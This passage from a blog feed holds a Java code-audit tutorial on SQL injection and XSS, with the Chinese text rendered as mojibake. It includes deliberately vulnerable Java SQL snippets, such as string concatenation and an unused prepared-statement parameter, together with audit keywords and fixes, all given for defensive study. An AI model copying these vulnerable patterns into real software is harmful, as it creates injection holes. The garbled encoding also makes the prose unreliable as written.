ï¼‰è¦æ³¨æ„å®‰å…¨ï¼Œä¸å¯æ‹¥æŒ¤ã€‚è´µé‡ç‰©å“è¯·å‹¿æºå¸¦è‡³æ°´ä¸Šï¼Œå¦‚æ‰‹æœºç­‰ç¡®éœ€æºå¸¦çš„ï¼Œè¯·é‡‡å–é˜²æ°´ä¿æŠ¤æªæ–½ã€‚</p><p>6ã€æ¸¸æ³³ã€æ¼‚æµã€æ½œæ°´ã€æ»‘é›ªã€æºœå†°ã€æˆé›ªã€å†²æµªã€æ¢é™©ã€çƒ­æ°”çƒã€é«˜å±±ç´¢é“ç­‰æ´»åŠ¨é¡¹ç›®ï¼Œå‡å­˜åœ¨å±é™©ã€‚å‚ä¸å‰è¯·æ ¹æ®è‡ªèº«æ¡ä»¶ï¼Œå¹¶å……åˆ†å‚è€ƒå½“åœ°ç›¸å…³éƒ¨é—¨åŠå…¶å®ƒä¸“ä¸šæœºæ„çš„ç›¸å…³å…¬å‘Šå’Œå»ºè®®åé‡åŠ›è€Œè¡Œã€‚è¯·åŠ¡å¿…ä»”ç»†é˜…è¯»æ™¯åŒºæç¤ºï¼Œåœ¨æ™¯åŒºæŒ‡å®šåŒºåŸŸå†…å¼€å±•æ´»åŠ¨ï¼Œæ³¨æ„äººèº«å®‰å…¨ï¼Œè¯·æ‚¨ä»”ç»†é˜…è¯»ç›¸å…³å®‰å…¨æŒ‡å—å’Œè­¦ç¤ºã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»£ç å®¡è®¡_åŸºç¡€ç¯‡</title>
    <link href="/2023/12/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <url>/2023/12/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»£ç å®¡è®¡-åŸºç¡€ç¯‡"><a href="#ä»£ç å®¡è®¡-åŸºç¡€ç¯‡" class="headerlink" title="ä»£ç å®¡è®¡__åŸºç¡€ç¯‡"></a>ä»£ç å®¡è®¡__åŸºç¡€ç¯‡</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¼€è¿™ä¸ªå‘ä¸»è¦è¿˜æ˜¯æƒ³å¸®åŠ©ä¸€äº›åˆæ­¥å­¦ä¹ äº†JavaåŸºç¡€ç¼ºä¸çŸ¥é“å¦‚ä½•å®¡è®¡çš„åŒå­¦ã€‚åŠ ä¸Šæˆ‘ä¹Ÿåœ¨å­¦ä¹ Javaå®¡è®¡ï¼Œæƒ³åšä¸ªå­¦ä¹ å†ç¨‹çš„è®°å½•ã€‚</p><p>æœ¬ç³»åˆ—å®¡è®¡å†…å®¹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>å®¡è®¡éœ€è¦å…·å¤‡çš„åŸºç¡€</li><li>å®¡è®¡åŸºç¡€æ¼æ´çš„æ¡ˆä¾‹ä»‹ç»ï¼ˆå…¶ä¸­åŒ…æ‹¬SQLæ³¨å…¥ã€XSSã€RCEç­‰ç­‰ï¼‰</li><li>ä»¥åŠåé¢ä¼šæœ‰ä¸€äº›ç»å…¸æ¼æ´çš„åˆ†æç­‰ï¼ˆè¿™ä¸ªä¸ä¸€å®šæœ‰ï¼Œå› ä¸ºæˆ‘ä¸€ç›´ä¹Ÿåœ¨åˆ†äº«å…¶ä»–çš„CVEåˆ†ææ–‡ç« ã€‚ä¸»è¦è¿˜æ˜¯çœ‹ä¸ªäººç²¾åŠ›å§ï¼‰</li></ul><h2 id="å·¥å…·å’Œç¯å¢ƒå‡†å¤‡ï¼š"><a href="#å·¥å…·å’Œç¯å¢ƒå‡†å¤‡ï¼š" class="headerlink" title="å·¥å…·å’Œç¯å¢ƒå‡†å¤‡ï¼š"></a>å·¥å…·å’Œç¯å¢ƒå‡†å¤‡ï¼š</h2><p>å®‰è£…çš„è¯ç½‘ä¸Šéƒ½æœ‰ï¼Œæœ€å¥½çœ‹çœ‹ç”¨IDEAæ­å»ºWEBç¯å¢ƒä¹‹ç±»çš„ã€‚å¯ä»¥ç”¨æ¡†æ¶ï¼Œä¹Ÿå¯ä»¥ä¸ç”¨æ¡†æ¶ï¼Œåˆå­¦è€…å»ºè®®ä¸è¦ä½¿ç”¨æ¡†æ¶ï¼Œä»£ç é è‡ªå·±æ‰‹å†™ä¼šè®°å¿†æ·±åˆ»ä¸€äº›ã€‚å› ä¸ºæˆ‘ä»¬éœ€è¦è‡ªå·±åŠ¨æ‰‹å†™ä»£ç ï¼Œä¸€æ–¹é¢å¯ä»¥çŸ¥é“æ¼æ´å¦‚ä½•äº§ç”Ÿï¼Ÿç„¶åå¦‚ä½•å»ä¿®å¤æ¼æ´ï¼Ÿè¿™æ ·è‡ªå·±åŠ¨æ‰‹å†™ä»£ç å­¦ä¹ ä¸‹æ¥ï¼Œå­¦ä¹ åä¼šæ¯”è¾ƒæ·±åˆ»ã€‚ä¸€å®šä¸€å®šä¸€å®šè‡ªå·±åŠ¨æ‰‹åšï¼ï¼ï¼ï¼ï¼ˆå¦‚æœä½ æƒ³å­¦å®¡è®¡çš„è¯ï¼‰</p><ul><li>IDEAï¼ˆç‰ˆæœ¬æ— æ‰€è°“ï¼Œæœ€å¥½ä¸è¦ç”¨<code>Community</code>ç‰ˆæœ¬å› ä¸ºæˆ‘ä¸‹çš„é‚£ä¸ª<code>Community</code>ç‰ˆæœ¬é‡Œé¢æ²¡æœ‰tomcatç›¸å…³çš„å¯åŠ¨ç»„ä»¶ã€‚è¿™ä¸ªæ˜¯é‡ç‚¹ï¼Œä¸ä¼šçš„è¯å¯ä»¥å…ˆçœ‹çœ‹IDEAçš„åŸºç¡€ç”¨æ³•)</li><li>Tomcatï¼ˆç‰ˆæœ¬çš„è¯Tomcat7 å’Œ Tomcat8éƒ½å¯)</li><li>MySQLï¼ˆè¿™ä¸ªå¯ä»¥ç”¨å°çš®ä»£æ›¿ï¼Œç¡®å®æ¯”è¾ƒæ–¹ä¾¿ã€‚ï¼‰</li><li>Javaï¼ˆJAVA8ï¼ï¼ï¼ ä½ é—®æˆ‘ä»€ä¹ˆæ˜¯Java8ï¼Ÿ  **1.8.***çš„éƒ½æ˜¯ï¼Œæœ€å¥½æŠŠç‰ˆæœ¬é™åˆ¶åœ¨1.8.3ä¹‹å†… ï¼‰</li><li><a href="https://java-decompiler.github.io/">JD-GUI</a>ï¼ˆè¿™ä¸€ä¸€æ¬¾Javaclassåç¼–è¯‘å·¥å…·ï¼Œå¯ä»¥æ ¹æ®å…³é”®å­—ç±»åç­‰ç­‰ä¿¡æ¯è¿›è¡Œæœç´¢å®šä½ã€‚å…¶å®IDEAä¹Ÿèƒ½åŠåˆ°ä½†æ˜¯æ ¹æ®å…³é”®å­—å®šä½çš„è¯è¿˜æ˜¯JDæ¯”è¾ƒå¥½ï¼‰</li><li><a href="https://www.microfocus.com/zh-cn/cyberres/application-security/static-code-analyzer">FortifySCA</a> ï¼ˆè·ŸPHPå®¡è®¡çš„é‚£ä¸ªå·®ä¸å¤šï¼Œè‡ªåŠ¨å®¡è®¡ç»“æœå¾ˆæ°´ã€‚ä»…ä¾›å‚è€ƒï¼‰</li></ul><h2 id="çŸ¥è¯†å‡†å¤‡"><a href="#çŸ¥è¯†å‡†å¤‡" class="headerlink" title="çŸ¥è¯†å‡†å¤‡"></a>çŸ¥è¯†å‡†å¤‡</h2><p>å…¶å®å°±æ˜¯æƒ³æŠŠTomcatçš„ç»“æ„å›¾ç»™å¤§å®¶æ¸…æ™°çš„å±•ç¤ºä¸€ä¸‹ï¼Œå…¶ä»–çŸ¥è¯†ç‚¹ç»™å¤§å®¶é™„äº†å­¦ä¹ é“¾æ¥ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»äº†ã€‚</p><h3 id="Tomcatæ¶æ„"><a href="#Tomcatæ¶æ„" class="headerlink" title="Tomcatæ¶æ„"></a>Tomcatæ¶æ„</h3><p>Tomcatçš„å†…å®¹ï¼Œåœ¨<a href="https://myloveguoguo.github.io/2023/10/25/%E5%88%9D%E8%AF%86%E5%86%85%E5%AD%98%E9%A9%AC/">ä¹‹å‰çš„æ–‡ç« </a>é‡Œé¢æœ‰æåŠè¿‡ï¼Œè¿™ä¸ªç»“æ„ä¸€å®šè¦æ¸…æ¥šå…¶ä¸­åŒ…æ‹¬ä¸‰å¤§ä»¶çš„è¯¦ç»†çŸ¥è¯†ã€‚è¿™ä¹Ÿæ˜¯Javawebå¼€å‘å¿…å¤‡çš„çŸ¥è¯†ã€‚æœ¬ç¯‡æ–‡ç« å°±ä¸è¿‡å¤šä»‹ç»ç»†èŠ‚ï¼Œç®€å•ä»‹ç»ä¸€ä¸‹æ¯ä¸ªæ¨¡å—çš„åŸºç¡€æ¦‚å¿µã€‚</p><p><img src="https://i.miji.bid/2023/12/15/b7f97b95ba2c1513f0a62cac10062d36.png" alt="b7f97b95ba2c1513f0a62cac10062d36"></p><ul><li><code>Connector</code>ï¼šè¿æ¥å™¨ï¼Œç”¨äºå¤„ç†å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ã€‚å®ƒè´Ÿè´£ç›‘å¬ç«¯å£ã€æ¥å—ä¼ å…¥çš„è¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚ä¼ é€’ç»™ Tomcat çš„å¤„ç†å¼•æ“ã€‚</li><li><code>ProtocolHandler</code>ï¼šåè®®å¤„ç†å™¨ï¼Œç”¨äºè§£æç‰¹å®šåè®®çš„è¯·æ±‚ã€‚å®ƒè´Ÿè´£æ¥æ”¶åŸå§‹çš„ç½‘ç»œæ•°æ®æµï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºå¯è¯†åˆ«çš„è¯·æ±‚å¯¹è±¡ã€‚</li><li><code>Endpoint</code>ï¼šç«¯ç‚¹ï¼Œè¡¨ç¤º Tomcat ä¸å®¢æˆ·ç«¯ä¹‹é—´çš„è¿æ¥ç‚¹ã€‚å®ƒç®¡ç†å®¢æˆ·ç«¯è¿æ¥çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬è¿æ¥çš„å»ºç«‹ã€ç»´æŠ¤å’Œå…³é—­ã€‚</li><li><code>Processor</code>ï¼šå¤„ç†å™¨ï¼Œç”¨äºå¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ã€‚å®ƒæ¥æ”¶æ¥è‡ª Connector çš„è¯·æ±‚ï¼Œå¹¶è°ƒç”¨é€‚å½“çš„ Adapter æ¥å¤„ç†è¯·æ±‚ã€‚</li><li><code>Adapter</code>ï¼šé€‚é…å™¨ï¼Œç”¨äºå°† Tomcat æ¥æ”¶åˆ°çš„è¯·æ±‚é€‚é…ç»™ä¸åŒç±»å‹çš„å®¹å™¨ã€‚å®ƒå°†è¯·æ±‚è½¬å‘åˆ°é€‚å½“çš„å®¹å™¨ï¼ˆå¦‚ Servlet å®¹å™¨ï¼‰è¿›è¡Œå¤„ç†ã€‚</li><li><code>Container</code>ï¼šå®¹å™¨ï¼Œåœ¨ Tomcat ä¸­æŒ‡çš„æ˜¯ä¸€ä¸ªé€šç”¨çš„ç»„ä»¶ï¼Œç”¨äºæ‰˜ç®¡ Servletã€JSP ç­‰ã€‚å®ƒè´Ÿè´£ç®¡ç†å’Œæ‰§è¡Œç‰¹å®šç±»å‹çš„ Web ç»„ä»¶ã€‚</li><li><code>Engine</code>ï¼šå¼•æ“ï¼Œä»£è¡¨ Tomcat çš„æ ¸å¿ƒå¤„ç†å¼•æ“ï¼Œç”¨äºå¤„ç†æ¥æ”¶åˆ°çš„è¯·æ±‚å¹¶å°†å…¶è·¯ç”±åˆ°ç›¸åº”çš„è™šæ‹Ÿä¸»æœºï¼ˆHostï¼‰ã€‚</li><li><code>Host</code>ï¼šä¸»æœºï¼ŒæŒ‡çš„æ˜¯ Tomcat ä¸­çš„è™šæ‹Ÿä¸»æœºï¼Œç”¨äºæ‰˜ç®¡ä¸€ä¸ªæˆ–å¤šä¸ª Web åº”ç”¨ç¨‹åºã€‚</li><li><code>Context</code>ï¼šä¸Šä¸‹æ–‡ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ª Web åº”ç”¨ç¨‹åºåœ¨ Tomcat ä¸­çš„ä¸Šä¸‹æ–‡è·¯å¾„å’Œé…ç½®ä¿¡æ¯ã€‚</li><li><code>Wrapper</code>ï¼šåŒ…è£…å™¨ï¼Œç”¨äºåŒ…è£…å’Œç®¡ç† Servletï¼Œæ¯ä¸ª Servlet å¯¹åº”ä¸€ä¸ª Wrapper å¯¹è±¡ã€‚</li><li><code>Servlet</code>ï¼šJava Web åº”ç”¨ç¨‹åºä¸­çš„æ ¸å¿ƒç»„ä»¶ï¼Œç”¨äºå¤„ç†å®¢æˆ·ç«¯è¯·æ±‚å¹¶ç”Ÿæˆå“åº”ã€‚</li></ul><h3 id="JSPåŸºç¡€"><a href="#JSPåŸºç¡€" class="headerlink" title="JSPåŸºç¡€"></a>JSPåŸºç¡€</h3><p>åŸºç¡€ã€åŸºç¡€ã€åŸºç¡€ï¼ï¼ï¼</p><ul><li><a href="https://link.zhihu.com/?target=https://www.runoob.com/jsp/jsp-tutorial.html">JSP æ•™ç¨‹ | èœé¸Ÿæ•™ç¨‹ </a></li><li><a href="https://www.bilibili.com/video/BV1Qf4y1T7Hx?p=112&vd_source=1b099c5cfbbe629dd188d9b675e8e716">é»‘é©¬ç¨‹åºå‘˜ | JavaWeb</a></li></ul><h3 id="JDBCåŸºç¡€"><a href="#JDBCåŸºç¡€" class="headerlink" title="JDBCåŸºç¡€"></a>JDBCåŸºç¡€</h3><p>å­¦ä¹ JDBCä¸»è¦ä¸ºäº†äº§å‡ºSqlæ³¨å…¥å’Œä¸€äº›å…¶ä»–çš„éå¸¸è§„æ¼æ´ã€‚</p><ul><li><a href="https://www.runoob.com/w3cnote/jdbc-use-guide.html">JDBC æ•™ç¨‹ | èœé¸Ÿæ•™ç¨‹ </a></li><li><a href="https://www.bilibili.com/video/BV1Qf4y1T7Hx?p=30&vd_source=1b099c5cfbbe629dd188d9b675e8e716">é»‘é©¬ç¨‹åºå‘˜ | JavaWeb</a></li></ul><h3 id="Springæ¡†æ¶å­¦ä¹ "><a href="#Springæ¡†æ¶å­¦ä¹ " class="headerlink" title="Springæ¡†æ¶å­¦ä¹ "></a>Springæ¡†æ¶å­¦ä¹ </h3><p>å­¦ä¹ ä¸»æµæ¡†æ¶å¯ä»¥è®©æˆ‘ä»¬åœ¨ä»Šåå®¡è®¡è¿‡ç¨‹ä¸­å¿«é€Ÿå®šä½å…³é”®ç‚¹ã€‚</p><ul><li><a href="https://github.com/Y4tacker/JavaSec/tree/main/0.%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/SpringBoot2">Y4tacker | JavaSec</a></li><li><a href="https://zhuanlan.zhihu.com/p/649404143">Native8418 | Spring Security ä¸€</a></li><li><a href="https://zhuanlan.zhihu.com/p/649687477">Native8418 | Spring Security äºŒ</a></li><li><a href="https://zhuanlan.zhihu.com/p/649687530">Native8418 | Spring Security ä¸‰</a></li></ul><h3 id="å±‚çº§å­¦ä¹ "><a href="#å±‚çº§å­¦ä¹ " class="headerlink" title="å±‚çº§å­¦ä¹ "></a>å±‚çº§å­¦ä¹ </h3><p>æ•´ä¸ªå±‚çº§æµç¨‹å¦‚ä¸‹å›¾ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç®€å•ä»‹ç»ä¸€ä¸‹å¯¹åº”çš„å±‚çº§æ¦‚å¿µã€‚</p><p><img src="https://i.miji.bid/2023/12/15/fed80280c831986eb1ad40db973e4c75.png" alt="fed80280c831986eb1ad40db973e4c75"></p><h4 id="Controllerå±‚"><a href="#Controllerå±‚" class="headerlink" title="Controllerå±‚"></a>Controllerå±‚</h4><p>Controllerå±‚è´Ÿè´£å…·ä½“çš„ä¸šåŠ¡æ¨¡å—æµç¨‹çš„æ§åˆ¶ï¼Œcontrollerå±‚è´Ÿè´£å‰åç«¯äº¤äº’ï¼Œæ¥å—å‰ç«¯è¯·æ±‚ï¼Œè°ƒç”¨serviceå±‚ï¼Œæ¥æ”¶serviceå±‚è¿”å›çš„æ•°æ®ï¼Œæœ€åè¿”å›å…·ä½“çš„é¡µé¢å’Œæ•°æ®åˆ°å®¢æˆ·ç«¯ã€‚</p><h4 id="DAOå±‚"><a href="#DAOå±‚" class="headerlink" title="DAOå±‚"></a>DAOå±‚</h4><p>DAOå±‚&#x3D;mapperå±‚ï¼Œç°åœ¨ç”¨Mybatisé€†å‘å·¥ç¨‹ç”Ÿæˆçš„mapperå±‚ï¼Œå…¶å®å°±æ˜¯daoå±‚ã€‚DAOå±‚ä¼šè°ƒç”¨entityå±‚ï¼ŒDAOä¸­ä¼šå®šä¹‰å®é™…ä½¿ç”¨åˆ°çš„æ–¹æ³•ï¼Œæ¯”å¦‚å¢åˆ æ”¹æŸ¥ã€‚DAO  å±‚çš„æ•°æ®æºå’Œæ•°æ®åº“è¿æ¥çš„å‚æ•°éƒ½æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®çš„ï¼Œé…ç½®æ–‡ä»¶ä¸€èˆ¬åœ¨åŒå±‚çš„XMLæ–‡ä»¶å¤¹ä¸­ã€‚æ•°æ®æŒä¹…åŒ–æ“ä½œå°±æ˜¯æŒ‡ï¼ŒæŠŠæ•°æ®æ”¾åˆ°æŒä¹…åŒ–çš„ä»‹è´¨ä¸­ï¼ŒåŒæ—¶æä¾›å¢åˆ æ”¹æŸ¥æ“ä½œã€‚</p><h4 id="Serviceå±‚"><a href="#Serviceå±‚" class="headerlink" title="Serviceå±‚"></a>Serviceå±‚</h4><p>Serviceå±‚ä¸»è¦è´Ÿè´£ä¸šåŠ¡æ¨¡å—çš„é€»è¾‘åº”ç”¨è®¾è®¡ã€‚å…ˆè®¾è®¡æ”¾æ¥å£çš„ç±»ï¼Œå†åˆ›å»ºå®ç°çš„ç±»ï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®å…¶å®ç°çš„å…³è”ã€‚serviceå±‚è°ƒç”¨daoå±‚æ¥å£ï¼Œæ¥æ”¶daoå±‚è¿”å›çš„æ•°æ®ï¼Œå®Œæˆé¡¹ç›®çš„åŸºæœ¬åŠŸèƒ½è®¾è®¡ã€‚</p><h4 id="é¢å¤–çš„ï¼š"><a href="#é¢å¤–çš„ï¼š" class="headerlink" title="é¢å¤–çš„ï¼š"></a>é¢å¤–çš„ï¼š</h4><p>Modelå®ä½“å±‚ï¼ˆæˆ–è€…å«Entityã€Beanï¼‰</p><p>Entityå±‚æ˜¯å®ä½“å±‚ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„modelï¼Œæ˜¯æ•°æ®åº“åœ¨é¡¹ç›®ä¸­çš„ç±»ï¼Œè¯¥æ–‡ä»¶åŒ…å«å®ä½“ç±»çš„å±æ€§å’Œå¯¹åº”å±æ€§çš„setã€getæ–¹æ³•ï¼›</p><h3 id="åŸºç¡€æ¼æ´äº§ç”ŸåŸå› "><a href="#åŸºç¡€æ¼æ´äº§ç”ŸåŸå› " class="headerlink" title="åŸºç¡€æ¼æ´äº§ç”ŸåŸå› "></a>åŸºç¡€æ¼æ´äº§ç”ŸåŸå› </h3><p>è¿™é‡Œå€Ÿä¸€ä¸‹<a href="https://su18.org/">su18å¸ˆå‚…</a>çš„åŸºç¡€æ¼æ´å®¡è®¡ã€‚å¤§å®¶å¯ä»¥å»å¸ˆå‚…çš„æ–‡ç« é“¾æ¥å­¦ä¹ ã€‚æˆ‘æ”¾åœ¨è¿™é‡Œæ˜¯ä¸ºäº†è‡ªå·±æ–¹ä¾¿æŸ¥çœ‹ã€‚</p><h4 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h4><h5 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><ul><li>ç›´æ¥ä½¿ç”¨SQLè¯­å¥æ‹¼æ¥ï¼Œå°†ç”¨æˆ·ä¼ å…¥çš„å‚æ•°é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ä¼ å…¥æŸ¥è¯¢è¯­å¥ã€‚<br>ç¤ºä¾‹ï¼š<code>String sql = &quot;select * from test where id = &quot; + id;</code></li><li>é¢„ç¼–è¯‘ä½¿ç”¨æœ‰è¯¯ï¼Œæ²¡æœ‰è°ƒç”¨ set æ–¹æ³•å°†å˜é‡ä¸å ä½ç¬¦è¿›è¡Œå¯¹åº”ã€‚<br>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from test where id = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstt</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br><span class="hljs-comment">// pstt.setObject(1,id);</span><br></code></pre></td></tr></table></figure><ul><li>å¯¹ % å’Œ _ æ²¡æœ‰è¿›è¡Œæ˜¾ç¤ºå¤„ç†ï¼Œ å¯¼è‡´ç”¨æˆ·å¯ä»¥è‡ªè¡Œæ‹¼æ¥è¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢ã€‚</li><li>ä¸èƒ½å‚æ•°åŒ–çš„ä½ç½®ï¼Œè¿˜æ˜¯æœ‰å¯èƒ½å­˜åœ¨æ‹¼æ¥çš„æƒ…å†µï¼Œå¦‚order byåé¢ã€‚<br>ç¤ºä¾‹ï¼š<code>String sql = &quot;select * from test where id = ? order by &#39;&quot; + time + &quot;&#39; asc&quot;;</code></li><li>Mybatisä¸­ï¼Œ#{}æ˜¯é¢„ç¼–è¯‘å¤„ç†ï¼Œ${}æ˜¯å­—ç¬¦ä¸²æ›¿æ¢ï¼Œä½¿ç”¨${}å°±å¯èƒ½å¯¼è‡´SQLæ³¨å…¥ã€‚<br>ç¤ºä¾‹ï¼š<code>Select * from news where title like &#39;%#&#123;title&#125;%&#39;</code></li></ul><h5 id="å®¡è®¡ç­–ç•¥"><a href="#å®¡è®¡ç­–ç•¥" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><ul><li>é‡ç‚¹å…³æ³¨åˆ›å»ºæŸ¥è¯¢çš„å‡½æ•°å¦‚ <code>createQuery()</code>ã€<code>createSQLQuery()</code>ã€<code>createNativeQuery()</code>ã€‚</li><li>å®šä½SQLè¯­å¥ä¸Šä¸‹æ–‡ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å‚æ•°ç›´æ¥æ‹¼æ¥ï¼Œæ˜¯å¦æœ‰å¯¹æ¨¡ç³ŠæŸ¥è¯¢å…³é”®å­—çš„è¿‡æ»¤ã€‚</li><li>æ˜¯å¦ä½¿ç”¨é¢„ç¼–è¯‘æŠ€æœ¯ï¼Œé¢„ç¼–è¯‘æ˜¯å¦å®Œæ•´ï¼Œå…³é”®å‡½æ•°å®šä½<code>setObject()</code>ã€<code>setInt()</code>ã€<code>setString()</code>ã€<code>setSQLXML()</code>å…³è”ä¸Šä¸‹æ–‡æœç´¢<code>set*</code>å¼€å¤´çš„å‡½æ•°ã€‚</li><li>Mybatisä¸­æœç´¢${}ï¼Œå› ä¸ºå¯¹äºlikeæ¨¡ç³ŠæŸ¥è¯¢ã€order byæ’åºã€èŒƒå›´æŸ¥è¯¢inã€åŠ¨æ€è¡¨å&#x2F;åˆ—åï¼Œæ²¡æ³•ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œåªèƒ½æ‹¼æ¥ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦æ‰‹å·¥é˜²æ³¨å…¥ï¼Œæ­¤æ—¶å¯æŸ¥çœ‹ç›¸å…³é€»è¾‘æ˜¯å¦æ­£ç¡®ã€‚</li><li>JPAæœç´¢<code>JpaSort.unsafe()</code>ï¼ŒæŸ¥çœ‹æ˜¯å¦ç”¨å®ä½“ä¹‹å¤–çš„å­—æ®µå¯¹æŸ¥è¯¢ç»“æœæ’åºï¼Œè¿›è¡Œäº†SQLçš„æ‹¼æ¥ã€‚ä»¥åŠæŸ¥çœ‹<code>EntityManager</code>çš„ä½¿ç”¨ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨æ‹¼æ¥SQLçš„æƒ…å†µã€‚</li></ul><h5 id="å¦‚ä½•ä¿®å¤"><a href="#å¦‚ä½•ä¿®å¤" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>æ­£ç¡®ä½¿ç”¨é¢„ç¼–è¯‘ï¼›æ— è®ºæ˜¯ SQL&#x2F;HQL&#x2F;JPQLï¼Œéƒ½ä¸è¿›è¡ŒSQLè¯­å¥å­—ç¬¦ä¸²æ‹¼æ¥ï¼›æ­£ç¡®ç†è§£å ä½ç¬¦ã€é¢„ç¼–è¯‘ã€æ›¿æ¢ã€å‚æ•°æ³¨å…¥ç­‰å½¢å¼çš„ä½¿ç”¨ã€‚</p><h4 id="XSS-é“¾æ¥æ³¨å…¥-æ¡†æ¶æ³¨å…¥"><a href="#XSS-é“¾æ¥æ³¨å…¥-æ¡†æ¶æ³¨å…¥" class="headerlink" title="XSS&#x2F;é“¾æ¥æ³¨å…¥&#x2F;æ¡†æ¶æ³¨å…¥"></a>XSS&#x2F;é“¾æ¥æ³¨å…¥&#x2F;æ¡†æ¶æ³¨å…¥</h4><h5 id="æ¼æ´æˆå› -1"><a href="#æ¼æ´æˆå› -1" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>å¯¹äºç”¨æˆ·ä¼ é€’å‚æ•°ï¼Œæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´æ¶æ„æ”»å‡»è€…å¯ä»¥æ’å…¥ä¸€äº›æ¶æ„çš„jsè¯­å¥ã€æ ‡ç­¾ã€frameç­‰æ¥è·å–åº”ç”¨æˆ–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-1"><a href="#å®¡è®¡ç­–ç•¥-1" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>å®¡è®¡è¿‡ç¨‹è¦ç‚¹è¿˜æ˜¯å®šä½ç”¨æˆ·çš„è¾“å…¥è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯æ¢³ç†æ•°æ®äº¤äº’ä»¥åŠå‰ç«¯å±•ç¤ºçš„è¿‡ç¨‹ã€‚æ‰¾åˆ°ä¸€æ¡å®Œæ•´çš„åˆ©ç”¨é“¾ä¹‹åï¼Œå°±æ˜¯ç»“åˆç°æœ‰çš„å®‰å…¨æªæ–½ï¼ˆè¾“å‡ºç¼–ç ã€è¿‡æ»¤å™¨ç­‰ï¼‰è¿›è¡Œåˆ¤æ–­ï¼Œä¾‹å¦‚æ˜¯å¦å­˜åœ¨ç»•è¿‡çš„å¯èƒ½ï¼Œæˆ–è€…æ˜¯æ²¡æœ‰ä»»ä½•å®‰å…¨é˜²æŠ¤å¯ç›´æ¥é€ æˆæ”»å‡»ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€äº›å¯ä»¥å¿«é€Ÿå®šä½çš„å…³é”®å­—ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;%<span class="hljs-operator">=</span><br>$&#123;<br>&lt;<span class="hljs-keyword">c</span>:out<br>&lt;<span class="hljs-keyword">c</span>:if<br>&lt;<span class="hljs-keyword">c</span>:forEach<br>ModelAndView<br>ModelMap<br>Model<br>request.getParameter<br>request.setAttribute<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬ä¼šä½¿ç”¨å…¨å±€çš„Filterè¿›è¡Œxssçš„è¿‡æ»¤ï¼Œä½†é€šå¸¸å¯èƒ½å­˜åœ¨æ¼ç½‘ä¹‹é±¼ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦å®¡è®¡å…¨å±€è¿‡æ»¤è§„åˆ™æ˜¯å¦å®Œå–„ã€‚å¯ä»¥é€šè¿‡å…³é”®å­— <code>XssFilter</code> è¿›è¡Œæœç´¢ã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-1"><a href="#å¦‚ä½•ä¿®å¤-1" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>è‡ªå®šä¹‰å…¨å±€è¿‡æ»¤å™¨ï¼Œå¯¹ç”¨æˆ·æäº¤è¾“å…¥è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼›å¯¹ç”¨æˆ·è¾“å…¥å¹¶ç”¨æ¥å±•ç¤ºçš„æ•°æ®è¿›è¡ŒHTMLè½¬ä¹‰ï¼Œå¯ç”¨çš„å·¥å…·ç±»åŒ…æ‹¬<code>org.springframework.web.util.HtmlUtils</code> 